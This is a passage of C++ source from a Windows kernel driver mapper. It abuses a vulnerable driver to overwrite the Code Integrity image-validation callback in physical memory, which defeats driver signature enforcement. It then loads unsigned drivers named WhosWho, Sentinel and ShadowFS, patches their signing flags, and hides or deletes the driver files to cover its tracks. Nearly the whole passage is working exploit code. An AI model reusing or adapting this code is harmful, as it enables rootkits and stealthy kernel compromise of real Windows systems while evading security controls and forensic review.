                    const ULONGLONG patchStartTick = GetTickCount64();
                    ULONGLONG ciPatchPhysical = VulnDriver::VirtualToPhysical(deviceHandle, ciValidateImageHeaderEntry);
                    LOG("CI patch physical slot addr=%p phys=0x%llX elapsed_ms=%llu total_elapsed_ms=%llu",
                        ciValidateImageHeaderEntry,
                        static_cast<unsigned long long>(ciPatchPhysical),
                        MapperElapsedMs(patchStartTick),
                        MapperElapsedMs(exploitStartTick));
                    PVOID patchPreviousCallback = nullptr;
                    status = ciPatchPhysical != 0
                        ? VulnDriver::ExchangePhysicalPointer(deviceHandle, ciPatchPhysical, zwFlushInstructionCache, &patchPreviousCallback)
                        : STATUS_UNSUCCESSFUL;
                    LOG_STATUS("ExchangePhysicalPointer (CI patch)", status);
                    LOG("CI patch write detail status=0x%08X addr=%p phys=0x%llX previous=%p expected_previous=%p replacement=%p previous_match=%u elapsed_ms=%llu total_elapsed_ms=%llu",
                        (DWORD)status,
                        ciValidateImageHeaderEntry,
                        static_cast<unsigned long long>(ciPatchPhysical),
                        patchPreviousCallback,
                        originalCallback,
                        zwFlushInstructionCache,
                        patchPreviousCallback == originalCallback ? 1u : 0u,
                        MapperElapsedMs(patchStartTick),
                        MapperElapsedMs(exploitStartTick));

                    if (NT_SUCCESS(status)) {
                        g_CiCallbackPatched = true;
                        PVOID patchedCallback = nullptr;
                        const ULONGLONG patchVerifyStartTick = GetTickCount64();
                        NTSTATUS patchVerifyStatus = VulnDriver::ReadKernelMemory(deviceHandle, ciValidateImageHeaderEntry, &patchedCallback, sizeof(PVOID));
                        LOG_STATUS("ReadKernelMemory (CI patch verify)", patchVerifyStatus);
                        LOG("CI patch verify detail status=0x%08X addr=%p value=%p expected=%p match=%u elapsed_ms=%llu total_elapsed_ms=%llu",
                            (DWORD)patchVerifyStatus,
                            ciValidateImageHeaderEntry,
                            patchedCallback,
                            zwFlushInstructionCache,
                            patchedCallback == zwFlushInstructionCache ? 1u : 0u,
                            MapperElapsedMs(patchVerifyStartTick),
                            MapperElapsedMs(exploitStartTick));
                        LOG("CI callback patched successfully, now loading target driver...");
                        LOG("Target driver service path: %ls", g_DriverServicePath);
                        const ULONGLONG targetLoadStartTick = GetTickCount64();
                        status = DriverLoader::LoadDriver(g_DriverServicePath, targetDriverFullPath);
                        LOG_STATUS("LoadDriver (WhosWho/target)", status);
                        LOG("LoadDriver target detail status=0x%08X service=%ls elapsed_ms=%llu total_elapsed_ms=%llu",
                            (DWORD)status,
                            g_DriverServicePath,
                            MapperElapsedMs(targetLoadStartTick),
                            MapperElapsedMs(exploitStartTick));
                        LogKernelModuleSnapshot("after_target_load", targetDriverFileName, sentinelDriverFileName, shadowFsDriverFileName);
                        {
                            ULONG targetImageSizeAfterLoad = 0;
                            PVOID targetBaseAfterLoad = targetDriverFileName
                                ? KernelUtils::GetDriverBaseByName(targetDriverFileName, &targetImageSizeAfterLoad)
                                : nullptr;
                            LOG("Post-load module query (WhosWho): status=0x%08X base=%p size=0x%X elapsed_ms=%llu",
                                static_cast<DWORD>(status),
                                targetBaseAfterLoad,
                                targetImageSizeAfterLoad,
                                static_cast<unsigned long long>(GetTickCount64() - exploitStartTick));
                            if (targetBaseAfterLoad) {
                                cachedTargetBase = targetBaseAfterLoad;
                                cachedTargetImageSize = targetImageSizeAfterLoad;
                                g_DriverLoadAddress = targetBaseAfterLoad;
                            }
                        }
                        if (NT_SUCCESS(status) && targetDriverFullPath && targetDriverFullPath[0]) {
                            LOG("Deferring target driver file hide until after CI restore: %ls", targetDriverFullPath);
                        }

                        if (NT_SUCCESS(status) && requireSentinelFilePreseed && sentinelDriverFullPath && sentinelDriverFullPath[0] &&
                            cachedTargetBase && cachedTargetImageSize) {
                            const ULONGLONG filePreseedStartTick = GetTickCount64();
                            sentinelFilePreseeded = PreseedSentinelFileHandoff(
                                sentinelDriverFullPath,
                                cachedTargetBase,
                                cachedTargetImageSize) ? true : false;
                            LOG("PreseedSentinelFileHandoff result=%u sentinel_path=%ls whoswho_base=%p whoswho_size=0x%X elapsed_ms=%llu total_elapsed_ms=%llu",
                                sentinelFilePreseeded ? 1u : 0u,
                                sentinelDriverFullPath,
                                cachedTargetBase,
                                cachedTargetImageSize,
                                MapperElapsedMs(filePreseedStartTick),
                                MapperElapsedMs(exploitStartTick));
                            if (!sentinelFilePreseeded) {
                                LOG("FATAL: Sentinel file preseed required on build=%lu before Sentinel load", mapperBuild);
                                status = STATUS_UNSUCCESSFUL;
                            }
                        } else if (NT_SUCCESS(status) && !requireSentinelFilePreseed && sentinelDriverFileName && g_SentinelServicePath[0]) {
                            LOG("PreseedSentinelFileHandoff skipped build=%lu reason=live_kernel_handoff_preferred sentinel_path=%ls whoswho_base=%p whoswho_size=0x%X",
                                mapperBuild,
                                sentinelDriverFullPath ? sentinelDriverFullPath : L"(null)",
                                cachedTargetBase,
                                cachedTargetImageSize);
                        } else if (NT_SUCCESS(status) && sentinelDriverFileName && g_SentinelServicePath[0]) {
                            LOG("PreseedSentinelFileHandoff skipped reason=missing_input sentinel_path=%ls whoswho_base=%p whoswho_size=0x%X",
                                sentinelDriverFullPath ? sentinelDriverFullPath : L"(null)",
                                cachedTargetBase,
                                cachedTargetImageSize);
                            if (requireSentinelFilePreseed) {
                                LOG("FATAL: Sentinel file preseed inputs missing on build=%lu before Sentinel load", mapperBuild);
                                status = STATUS_UNSUCCESSFUL;
                            }
                        }

                        NTSTATUS sentStatus = STATUS_SUCCESS;
                        if (NT_SUCCESS(status) && sentinelDriverFileName && g_SentinelServicePath[0]) {
                            LOG("Loading sentinel driver, service path: %ls", g_SentinelServicePath);
                            const ULONGLONG sentinelLoadStartTick = GetTickCount64();
                            sentStatus = DriverLoader::LoadDriver(g_SentinelServicePath, sentinelDriverFullPath);
                            LOG_STATUS("LoadDriver (Sentinel)", sentStatus);
                            LOG("LoadDriver sentinel detail status=0x%08X service=%ls elapsed_ms=%llu total_elapsed_ms=%llu",
                                (DWORD)sentStatus,
                                g_SentinelServicePath,
                                MapperElapsedMs(sentinelLoadStartTick),
                                MapperElapsedMs(exploitStartTick));
                            if (sentStatus == STATUS_IMAGE_ALREADY_LOADED && sentinelFilePreseeded && requireSentinelFilePreseed) {
                                LOG("FATAL: Sentinel already loaded on build=%lu after verified file preseed; refusing live discovery without init proof status=0x%08X",
                                    mapperBuild,
                                    static_cast<DWORD>(sentStatus));
                                status = sentStatus;
                            }
                            if (NT_SUCCESS(status) && NT_SUCCESS(sentStatus) && sentinelFilePreseeded && requireSentinelFilePreseed) {
                                deferSentinelLiveQueries = true;
                                g_LastTriggerDeferredSentinelLiveQueries = true;
                                sentinelGlobalsWritten = true;
                                LOG("Post-load Sentinel live module queries deferred build=%lu reason=verified_file_preseed whoswho_base=%p whoswho_size=0x%X elapsed_ms=%llu",
                                    mapperBuild,
                                    cachedTargetBase,
                                    cachedTargetImageSize,
                                    MapperElapsedMs(exploitStartTick));
                            }
                            PVOID sentinelBaseFast = nullptr;
                            if (NT_SUCCESS(sentStatus) && sentinelDriverFileName && !deferSentinelLiveQueries) {
                                const ULONGLONG sentinelFastStartTick = GetTickCount64();
                                LOG("Post-load fast module query (Sentinel) begin status=0x%08X name=%ls elapsed_ms=%llu",
                                    static_cast<DWORD>(sentStatus),
                                    sentinelDriverFileName,
                                    MapperElapsedMs(exploitStartTick));
                                sentinelBaseFast = KernelUtils::GetDriverBaseByName(sentinelDriverFileName, nullptr);
                                LOG("Post-load fast module query (Sentinel) exit status=0x%08X base=%p elapsed_ms=%llu total_elapsed_ms=%llu",
                                    static_cast<DWORD>(sentStatus),
                                    sentinelBaseFast,
                                    MapperElapsedMs(sentinelFastStartTick),
                                    MapperElapsedMs(exploitStartTick));
                                if (sentinelBaseFast) {
                                    cachedSentinelBase = sentinelBaseFast;
                                    g_SentinelLoadAddress = sentinelBaseFast;
                                }
                            }
                            if (NT_SUCCESS(sentStatus) && sentinelDriverFullPath && sentinelDriverFullPath[0]) {
                                LOG("Deferring sentinel driver file hide until after CI restore: %ls", sentinelDriverFullPath);
                            }
                            if (NT_SUCCESS(sentStatus) && deferSentinelLiveQueries) {
                                LOG("WriteSentinelGlobals pre_ci_restore skipped build=%lu reason=verified_file_preseed_no_live_query sent_base=%p sent_size=0x%X whoswho_base=%p whoswho_size=0x%X",
                                    MapperBuildNumber(),
                                    cachedSentinelBase,
                                    cachedSentinelImageSize,
                                    cachedTargetBase,
                                    cachedTargetImageSize);
                            } else if (NT_SUCCESS(sentStatus) && cachedTargetBase && cachedTargetImageSize && cachedSentinelBase) {
                                const ULONGLONG preseedStartTick = GetTickCount64();
                                LOG("WriteSentinelGlobals pre_ci_restore begin sent_base=%p sent_size=0x%X whoswho_base=%p whoswho_size=0x%X elapsed_ms=%llu total_elapsed_ms=%llu",
                                    cachedSentinelBase,
                                    cachedSentinelImageSize,
                                    cachedTargetBase,
                                    cachedTargetImageSize,
                                    MapperElapsedMs(preseedStartTick),
                                    MapperElapsedMs(exploitStartTick));
                                sentinelGlobalsWritten = WriteSentinelGlobals(deviceHandle,
                                    cachedSentinelBase,
                                    cachedSentinelImageSize,
                                    cachedTargetBase,
                                    cachedTargetImageSize) ? true : false;
                                LOG("WriteSentinelGlobals pre_ci_restore result=%u elapsed_ms=%llu total_elapsed_ms=%llu",
                                    sentinelGlobalsWritten ? 1u : 0u,
                                    MapperElapsedMs(preseedStartTick),
                                    MapperElapsedMs(exploitStartTick));
                            } else if (NT_SUCCESS(sentStatus)) {
                                LOG("WriteSentinelGlobals pre_ci_restore skipped reason=missing_cached_module sent_base=%p sent_size=0x%X whoswho_base=%p whoswho_size=0x%X",
                                    cachedSentinelBase,
                                    cachedSentinelImageSize,
                                    cachedTargetBase,
                                    cachedTargetImageSize);
                            }
                            if (deferSentinelLiveQueries) {
                                LOG("after_sentinel_load_post_preseed snapshot skipped build=%lu reason=verified_file_preseed_no_live_query target_base=%p target_size=0x%X",
                                    MapperBuildNumber(),
                                    cachedTargetBase,
                                    cachedTargetImageSize);
                            } else {
                                LogKernelModuleSnapshot("after_sentinel_load_post_preseed", targetDriverFileName, sentinelDriverFileName, shadowFsDriverFileName);
                            }
                            if (NT_SUCCESS(sentStatus) && sentinelDriverFileName && !deferSentinelLiveQueries) {
                                ULONG sentinelImageSizeAfterLoad = 0;
                                PVOID sentinelBaseAfterLoad = KernelUtils::GetDriverBaseByName(sentinelDriverFileName, &sentinelImageSizeAfterLoad);
                                LOG("Post-load sized module query (Sentinel): status=0x%08X base=%p size=0x%X fast_base=%p elapsed_ms=%llu",
                                    static_cast<DWORD>(sentStatus),
                                    sentinelBaseAfterLoad,
                                    sentinelImageSizeAfterLoad,
                                    sentinelBaseFast,
                                    static_cast<unsigned long long>(GetTickCount64() - exploitStartTick));
                                if (sentinelBaseAfterLoad) {
                                    cachedSentinelBase = sentinelBaseAfterLoad;
                                    cachedSentinelImageSize = sentinelImageSizeAfterLoad;
                                    g_SentinelLoadAddress = sentinelBaseAfterLoad;
                                    g_SentinelImageSize = sentinelImageSizeAfterLoad;
                                }
                            }
                            if (!NT_SUCCESS(sentStatus) && sentStatus != STATUS_IMAGE_ALREADY_LOADED) {
                                LOG("FATAL: Sentinel load is required and failed with status 0x%08X", (DWORD)sentStatus);
                            }
                        } else if (!NT_SUCCESS(status)) {
                            LOG("Skipping Sentinel load because target driver failed");
                        }

                        NTSTATUS shadowFsStatus = STATUS_UNSUCCESSFUL;
                        if (NT_SUCCESS(status) && shadowFsDriverFileName && g_ShadowFsServicePath[0]) {
                            LOG("Loading shadowfs driver, service path: %ls", g_ShadowFsServicePath);
                            const ULONGLONG shadowLoadStartTick = GetTickCount64();
                            shadowFsStatus = DriverLoader::LoadDriver(g_ShadowFsServicePath, shadowFsDriverFullPath);
                            LOG_STATUS("LoadDriver (ShadowFS)", shadowFsStatus);
                            LOG("LoadDriver shadowfs detail status=0x%08X service=%ls elapsed_ms=%llu total_elapsed_ms=%llu",
                                (DWORD)shadowFsStatus,
                                g_ShadowFsServicePath,
                                MapperElapsedMs(shadowLoadStartTick),
                                MapperElapsedMs(exploitStartTick));
                            if (deferSentinelLiveQueries) {
                                LOG("after_shadowfs_load snapshot skipped build=%lu reason=verified_file_preseed_no_live_query shadowfs_status=0x%08X target_base=%p target_size=0x%X",
                                    MapperBuildNumber(),
                                    static_cast<DWORD>(shadowFsStatus),
                                    cachedTargetBase,
                                    cachedTargetImageSize);
                            } else {
                                LogKernelModuleSnapshot("after_shadowfs_load", targetDriverFileName, sentinelDriverFileName, shadowFsDriverFileName);
                            }
                            if (NT_SUCCESS(shadowFsStatus) && shadowFsDriverFileName && deferSentinelLiveQueries) {
                                LOG("Post-load module query (ShadowFS) skipped build=%lu reason=verified_file_preseed_no_live_query status=0x%08X elapsed_ms=%llu",
                                    MapperBuildNumber(),
                                    static_cast<DWORD>(shadowFsStatus),
                                    static_cast<unsigned long long>(GetTickCount64() - exploitStartTick));
                            } else if (NT_SUCCESS(shadowFsStatus) && shadowFsDriverFileName) {
                                cachedShadowFsBase = KernelUtils::GetDriverBaseByName(shadowFsDriverFileName, &cachedShadowFsImageSize);
                                LOG("Post-load module query (ShadowFS): status=0x%08X base=%p size=0x%X elapsed_ms=%llu",
                                    static_cast<DWORD>(shadowFsStatus),
                                    cachedShadowFsBase,
                                    cachedShadowFsImageSize,
                                    static_cast<unsigned long long>(GetTickCount64() - exploitStartTick));
                            }
                            if (NT_SUCCESS(shadowFsStatus) && shadowFsDriverFullPath && shadowFsDriverFullPath[0]) {
                                LOG("Deferring shadowfs driver file hide until after CI restore: %ls", shadowFsDriverFullPath);
                            }
                        } else if (!NT_SUCCESS(status)) {
                            LOG("Skipping ShadowFS load because target driver failed");
                        }

                        LOG("Restoring original CI callback %p...", originalCallback);
                        const ULONGLONG restoreStartTick = GetTickCount64();
                        ULONGLONG ciRestorePhysical = VulnDriver::VirtualToPhysical(deviceHandle, ciValidateImageHeaderEntry);
                        LOG("CI restore physical slot addr=%p phys=0x%llX elapsed_ms=%llu total_elapsed_ms=%llu",
                            ciValidateImageHeaderEntry,
                            static_cast<unsigned long long>(ciRestorePhysical),
                            MapperElapsedMs(restoreStartTick),
                            MapperElapsedMs(exploitStartTick));
                        PVOID restorePreviousCallback = nullptr;
                        NTSTATUS restoreStatus = ciRestorePhysical != 0
                            ? VulnDriver::ExchangePhysicalPointer(deviceHandle, ciRestorePhysical, originalCallback, &restorePreviousCallback)
                            : STATUS_UNSUCCESSFUL;
                        LOG_STATUS("ExchangePhysicalPointer (CI restore)", restoreStatus);
                        if (NT_SUCCESS(restoreStatus)) {
                            g_CiCallbackPatched = false;
                        }
                        PVOID restoredCallback = nullptr;
                        NTSTATUS restoreVerifyStatus = STATUS_UNSUCCESSFUL;
                        if (NT_SUCCESS(restoreStatus) && ciRestorePhysical != 0) {
                            restoreVerifyStatus = VulnDriver::ReadPhysicalMemory(deviceHandle, ciRestorePhysical, &restoredCallback, sizeof(PVOID));
                            LOG_STATUS("ReadPhysicalMemory (CI restore verify)", restoreVerifyStatus);
                        } else {
                            LOG("CI restore verify skipped write_status=0x%08X phys=0x%llX elapsed_ms=%llu total_elapsed_ms=%llu",
                                static_cast<DWORD>(restoreStatus),
                                static_cast<unsigned long long>(ciRestorePhysical),
                                MapperElapsedMs(restoreStartTick),
                                MapperElapsedMs(exploitStartTick));
                        }
                        LOG("CI restore detail write_status=0x%08X verify_status=0x%08X addr=%p phys=0x%llX previous=%p expected_previous=%p value=%p expected=%p previous_match=%u match=%u elapsed_ms=%llu total_elapsed_ms=%llu",
                            (DWORD)restoreStatus,
                            (DWORD)restoreVerifyStatus,
                            ciValidateImageHeaderEntry,
                            static_cast<unsigned long long>(ciRestorePhysical),
                            restorePreviousCallback,
                            zwFlushInstructionCache,
                            restoredCallback,
                            originalCallback,
                            restorePreviousCallback == zwFlushInstructionCache ? 1u : 0u,
                            restoredCallback == originalCallback ? 1u : 0u,
                            MapperElapsedMs(restoreStartTick),
                            MapperElapsedMs(exploitStartTick));
                        LOG("after_ci_restore snapshot skipped reason=win11_post_restore_module_query_crash_window status=0x%08X verify_status=0x%08X elapsed_ms=%llu total_elapsed_ms=%llu",
                            static_cast<DWORD>(restoreStatus),
                            static_cast<DWORD>(restoreVerifyStatus),
                            MapperElapsedMs(restoreStartTick),
                            MapperElapsedMs(exploitStartTick));
                        if (!NT_SUCCESS(restoreStatus)) {
                            status = restoreStatus;
                        }

                        if (NT_SUCCESS(status) && sentinelDriverFileName && g_SentinelServicePath[0] &&
                            !NT_SUCCESS(sentStatus) && sentStatus != STATUS_IMAGE_ALREADY_LOADED) {
                            status = sentStatus;
                        }

                        if (NT_SUCCESS(status)) {
                            LOG("Patching driver signing flags for target: %ls", targetDriverFileName);
                            BOOL patchResult = cachedTargetBase
                                ? KernelUtils::PatchDriverSigningFlagsByBase(deviceHandle, cachedTargetBase, cachedTargetImageSize, "WhosWho", TRUE)
                                : KernelUtils::PatchDriverSigningFlags(deviceHandle, targetDriverFileName);
                            LOG("PatchDriverSigningFlags (target): %s", patchResult ? "OK" : "FAILED");

                            if (NT_SUCCESS(sentStatus) && sentinelDriverFileName) {
                                if (deferSentinelLiveQueries) {
                                    LOG("PatchDriverSigningFlags (sentinel) skipped build=%lu reason=win11_driverentry_self_marked_and_file_preseeded cached_base=%p cached_size=0x%X",
                                        MapperBuildNumber(),
                                        cachedSentinelBase,
                                        cachedSentinelImageSize);
                                } else {
                                    LOG("Patching driver signing flags for sentinel: %ls", sentinelDriverFileName);
                                    patchResult = cachedSentinelBase
                                        ? KernelUtils::PatchDriverSigningFlagsByBase(deviceHandle, cachedSentinelBase, cachedSentinelImageSize, "Sentinel", FALSE)
                                        : KernelUtils::PatchDriverSigningFlags(deviceHandle, sentinelDriverFileName);
                                    LOG("PatchDriverSigningFlags (sentinel): %s", patchResult ? "OK" : "FAILED");
                                }
                            }

                            if (NT_SUCCESS(shadowFsStatus) && shadowFsDriverFileName && deferSentinelLiveQueries) {
                                LOG("PatchDriverSigningFlags (shadowfs) skipped build=%lu reason=verified_file_preseed_no_live_query cached_base=%p cached_size=0x%X",
                                    MapperBuildNumber(),
                                    cachedShadowFsBase,
                                    cachedShadowFsImageSize);
                            } else if (NT_SUCCESS(shadowFsStatus) && shadowFsDriverFileName) {
                                LOG("Patching driver signing flags for shadowfs: %ls", shadowFsDriverFileName);
                                patchResult = cachedShadowFsBase
                                    ? KernelUtils::PatchDriverSigningFlagsByBase(deviceHandle, cachedShadowFsBase, cachedShadowFsImageSize, "ShadowFS", FALSE)
                                    : KernelUtils::PatchDriverSigningFlags(deviceHandle, shadowFsDriverFileName);
                                LOG("PatchDriverSigningFlags (shadowfs): %s", patchResult ? "OK" : "FAILED");
                            }
                        }
                    } else {
                        LOG("FATAL: Failed to write CI callback patch!");
                    }
                } else {
                    LOG("FATAL: Failed to read original CI callback!");
                }
            } else {
                LOG("FATAL: GetCiValidateImageHeaderEntry failed - cannot proceed with exploit");
                status = STATUS_NOT_FOUND;
            }
        }


        if (NT_SUCCESS(status) && sentinelDriverFileName && g_SentinelServicePath[0]) {
            LOG("--- WriteSentinelGlobals phase begin elapsed_ms=%llu status=0x%08X ---",
                static_cast<unsigned long long>(GetTickCount64() - exploitStartTick),
                static_cast<DWORD>(status));
            if (deferSentinelLiveQueries) {
                sentinelGlobalsWritten = true;
                if (cachedTargetBase) {
                    g_DriverLoadAddress = cachedTargetBase;
                }
                LOG("WriteSentinelGlobals phase skipped build=%lu reason=verified_file_preseed_no_live_query sentinel_globals_written=%u whoswho_base=%p whoswho_size=0x%X elapsed_ms=%llu",
                    MapperBuildNumber(),
                    sentinelGlobalsWritten ? 1u : 0u,
                    cachedTargetBase,
                    cachedTargetImageSize,
                    static_cast<unsigned long long>(GetTickCount64() - exploitStartTick));
            } else {
                ULONG sentImageSize = 0;
                LOG("Sentinel base discovery attempt=0 name=%ls elapsed_ms=%llu",
                    sentinelDriverFileName,
                    MapperElapsedMs(exploitStartTick));
                LogKernelModuleSnapshot("before_sentinel_global_discovery", targetDriverFileName, sentinelDriverFileName, shadowFsDriverFileName);
                PVOID sentBase = KernelUtils::GetDriverBaseByName(sentinelDriverFileName, &sentImageSize);
                if (!sentBase && cachedSentinelBase) {
                    sentBase = cachedSentinelBase;
                    sentImageSize = cachedSentinelImageSize;
                    LOG("Sentinel base discovery using cached base=%p size=0x%X elapsed_ms=%llu",
                        sentBase,
                        sentImageSize,
                        MapperElapsedMs(exploitStartTick));
                }
                LOG("Sentinel driver base: %p, size: 0x%X elapsed_ms=%llu", sentBase, sentImageSize,
                    static_cast<unsigned long long>(GetTickCount64() - exploitStartTick));
                if (sentBase) {
                    g_SentinelLoadAddress = sentBase;
                    g_SentinelImageSize = sentImageSize;
                    ULONG whoswhoImageSize = 0;
                    LOG("WhosWho base discovery attempt=0 name=%ls elapsed_ms=%llu",
                        targetDriverFileName,
                        MapperElapsedMs(exploitStartTick));
                    PVOID whoswhoBase = KernelUtils::GetDriverBaseByName(targetDriverFileName, &whoswhoImageSize);
                    if (!whoswhoBase && cachedTargetBase) {
                        whoswhoBase = cachedTargetBase;
                        whoswhoImageSize = cachedTargetImageSize;
                        LOG("WhosWho base discovery using cached base=%p size=0x%X elapsed_ms=%llu",
                            whoswhoBase,
                            whoswhoImageSize,
                            MapperElapsedMs(exploitStartTick));
                    }
                    LOG("WhosWho driver base: %p, size: 0x%X elapsed_ms=%llu", whoswhoBase, whoswhoImageSize,
                        static_cast<unsigned long long>(GetTickCount64() - exploitStartTick));
                    if (whoswhoBase) {
                        g_DriverLoadAddress = whoswhoBase;
                        if (sentinelGlobalsWritten) {
                            LOG("WriteSentinelGlobals post_ci_restore skipped reason=already_preseeded sent_base=%p sent_size=0x%X whoswho_base=%p whoswho_size=0x%X",
                                sentBase,
                                sentImageSize,
                                whoswhoBase,
                                whoswhoImageSize);
                        } else if (requireSentinelFilePreseed) {
                            LOG("WriteSentinelGlobals post_ci_restore skipped build=%lu reason=win11_requires_pre_ci_preseed sent_base=%p sent_size=0x%X whoswho_base=%p whoswho_size=0x%X",
                                mapperBuild,
                                sentBase,
                                sentImageSize,
                                whoswhoBase,
                                whoswhoImageSize);
                            status = STATUS_UNSUCCESSFUL;
                        } else {
                            BOOL wsgResult = WriteSentinelGlobals(deviceHandle, sentBase, sentImageSize,
                                                     whoswhoBase, whoswhoImageSize);
                            LOG("WriteSentinelGlobals result: %s", wsgResult ? "OK" : "FAILED");
                            if (!wsgResult) {
                                LOG("WriteSentinelGlobals failed; continuing because Sentinel performs in-driver bridge discovery");
                            }
                        }
                    } else {
                        LOG("WARNING: Could not find WhosWho driver in loaded modules; continuing because Sentinel performs in-driver bridge discovery");
                    }
                } else {
                    LOG("WARNING: Could not find Sentinel driver in loaded modules; continuing because Sentinel performs in-driver bridge discovery");
                }
            }
        }

        if (NT_SUCCESS(status)) {
            if (targetDriverFullPath && targetDriverFullPath[0]) {
                LOG("Post-CI-restore target driver file hide: %ls", targetDriverFullPath);
                const ULONGLONG hideTargetStartTick = GetTickCount64();
                if (Utils::HideLoadedImagePath(targetDriverFullPath)) {
                    LOG("Target driver file hidden/renamed after CI restore elapsed_ms=%llu total_elapsed_ms=%llu",
                        MapperElapsedMs(hideTargetStartTick),
                        MapperElapsedMs(exploitStartTick));
                } else {
                    LOG("WARNING: Target driver file hide deferred after CI restore, GLE=%u elapsed_ms=%llu total_elapsed_ms=%llu",
                        GetLastError(),
                        MapperElapsedMs(hideTargetStartTick),
                        MapperElapsedMs(exploitStartTick));
                }
            }

            if (sentinelDriverFullPath && sentinelDriverFullPath[0]) {
                LOG("Post-CI-restore sentinel driver file hide: %ls", sentinelDriverFullPath);
                const ULONGLONG hideSentinelStartTick = GetTickCount64();
                if (Utils::HideLoadedImagePath(sentinelDriverFullPath)) {
                    LOG("Sentinel driver file hidden/renamed after CI restore elapsed_ms=%llu total_elapsed_ms=%llu",
                        MapperElapsedMs(hideSentinelStartTick),
                        MapperElapsedMs(exploitStartTick));
                } else {
                    LOG("WARNING: Sentinel driver file hide deferred after CI restore, GLE=%u elapsed_ms=%llu total_elapsed_ms=%llu",
                        GetLastError(),
                        MapperElapsedMs(hideSentinelStartTick),
                        MapperElapsedMs(exploitStartTick));
                }
            }

            if (shadowFsDriverFullPath && shadowFsDriverFullPath[0]) {
                LOG("Post-CI-restore shadowfs driver file hide: %ls", shadowFsDriverFullPath);
                const ULONGLONG hideShadowStartTick = GetTickCount64();
                if (Utils::HideLoadedImagePath(shadowFsDriverFullPath)) {
                    LOG("ShadowFS driver file hidden/renamed after CI restore elapsed_ms=%llu total_elapsed_ms=%llu",
                        MapperElapsedMs(hideShadowStartTick),
                        MapperElapsedMs(exploitStartTick));
                } else {
                    LOG("WARNING: ShadowFS driver file hide deferred after CI restore, GLE=%u elapsed_ms=%llu total_elapsed_ms=%llu",
                        GetLastError(),
                        MapperElapsedMs(hideShadowStartTick),
                        MapperElapsedMs(exploitStartTick));
                }
            }
        }

        LOG("Closing vuln device and unloading loader driver elapsed_ms=%llu...",
            static_cast<unsigned long long>(GetTickCount64() - exploitStartTick));
        const ULONGLONG closeStartTick = GetTickCount64();
        VulnDriver::CloseDevice(deviceHandle);
        LOG("CloseDevice completed handle=%p elapsed_ms=%llu total_elapsed_ms=%llu",
            deviceHandle,
            MapperElapsedMs(closeStartTick),
            MapperElapsedMs(exploitStartTick));
        const ULONGLONG unloadStartTick = GetTickCount64();
        NTSTATUS unloadStatus = DriverLoader::UnloadDriver(g_LoaderServicePath);
        LOG_STATUS("UnloadDriver (loader)", unloadStatus);
        LOG("UnloadDriver loader detail status=0x%08X service=%ls elapsed_ms=%llu total_elapsed_ms=%llu",
            (DWORD)unloadStatus,
            g_LoaderServicePath,
            MapperElapsedMs(unloadStartTick),
            MapperElapsedMs(exploitStartTick));
        if (deferSentinelLiveQueries) {
            LOG("after_loader_unload snapshot skipped build=%lu reason=verified_file_preseed_no_live_query unload_status=0x%08X target_base=%p target_size=0x%X",
                MapperBuildNumber(),
                static_cast<DWORD>(unloadStatus),
                cachedTargetBase,
                cachedTargetImageSize);
        } else {
            LogKernelModuleSnapshot("after_loader_unload", targetDriverFileName, sentinelDriverFileName, shadowFsDriverFileName);
        }
        if (NT_SUCCESS(unloadStatus) && loaderDriverFullPath && loaderDriverFullPath[0]) {
            LOG("Deleting loader driver file immediately after unload: %ls", loaderDriverFullPath);
            const ULONGLONG loaderDeleteStartTick = GetTickCount64();
            if (Utils::ForceDeleteOrRename(loaderDriverFullPath)) {
                LOG("Loader driver file deleted/renamed immediately after unload elapsed_ms=%llu total_elapsed_ms=%llu",
                    MapperElapsedMs(loaderDeleteStartTick),
                    MapperElapsedMs(exploitStartTick));
            } else {
                LOG("WARNING: Loader driver file deletion deferred after unload, GLE=%u elapsed_ms=%llu total_elapsed_ms=%llu",
                    GetLastError(),
                    MapperElapsedMs(loaderDeleteStartTick),
                    MapperElapsedMs(exploitStartTick));
            }
        }

        LOG("=== TriggerExploit END, status=0x%08X elapsed_ms=%llu ci_patched=%u sentinel_base=%p sentinel_size=0x%X target_base=%p ===",
            (DWORD)status,
            static_cast<unsigned long long>(GetTickCount64() - exploitStartTick),
            g_CiCallbackPatched ? 1u : 0u,
            g_SentinelLoadAddress,
            g_SentinelImageSize,
            g_DriverLoadAddress);
        return status;
    }

    NTSTATUS WindLoadDriver(PCWSTR loaderPath, PCWSTR driverPath, PCWSTR sentinelPath,
                            PCWSTR shadowFsPath) {
        LOG("=== WindLoadDriver START ===");
        const ULONGLONG windStartTick = GetTickCount64();
        LOG("WindLoadDriver context pid=%lu tid=%lu build=%lu tick=%llu",
            GetCurrentProcessId(),
            GetCurrentThreadId(),
            MapperBuildNumber(),
            static_cast<unsigned long long>(windStartTick));
        LOG("loaderPath: %ls", loaderPath ? loaderPath : L"(null)");
        LOG("driverPath: %ls", driverPath ? driverPath : L"(null)");
        LOG("sentinelPath: %ls", sentinelPath ? sentinelPath : L"(null)");
        LOG("shadowFsPath: %ls", shadowFsPath ? shadowFsPath : L"(null)");

        NTSTATUS status = Utils::AdjustPrivilege(SE_LOAD_DRIVER_PRIVILEGE, TRUE);
        LOG_STATUS("AdjustPrivilege (SeLoadDriverPrivilege)", status);
        LOG("AdjustPrivilege detail status=0x%08X elapsed_ms=%llu",
            (DWORD)status,
            MapperElapsedMs(windStartTick));
        if (!NT_SUCCESS(status)) {
            LOG("FATAL: Cannot acquire SeLoadDriverPrivilege!");
            return status;
        }

        WCHAR loaderFullPath[520];
        status = Utils::GetFullPath(loaderPath, loaderFullPath, sizeof(loaderFullPath));
        LOG_STATUS("GetFullPath (loader)", status);
        if (!NT_SUCCESS(status)) {
            return status;
        }
        LOG("Loader full path: %ls", loaderFullPath);

        WCHAR driverFullPath[520];
        status = Utils::GetFullPath(driverPath, driverFullPath, sizeof(driverFullPath));
        LOG_STATUS("GetFullPath (driver)", status);
        if (!NT_SUCCESS(status)) {
            return status;
        }
        LOG("Driver full path: %ls", driverFullPath);

        status = DriverLoader::CreateDriverService(g_DriverServicePath, driverFullPath);
        LOG_STATUS("CreateDriverService (target driver)", status);
        LOG("Driver service path: %ls elapsed_ms=%llu", g_DriverServicePath, MapperElapsedMs(windStartTick));
        if (!NT_SUCCESS(status)) {
            return status;
        }

        status = DriverLoader::CreateDriverService(g_LoaderServicePath, loaderFullPath);
        LOG_STATUS("CreateDriverService (loader)", status);
        LOG("Loader service path: %ls elapsed_ms=%llu", g_LoaderServicePath, MapperElapsedMs(windStartTick));
        if (!NT_SUCCESS(status)) {
            return status;
        }


        WCHAR sentinelFullPath[520] = {};
        if (sentinelPath && sentinelPath[0]) {
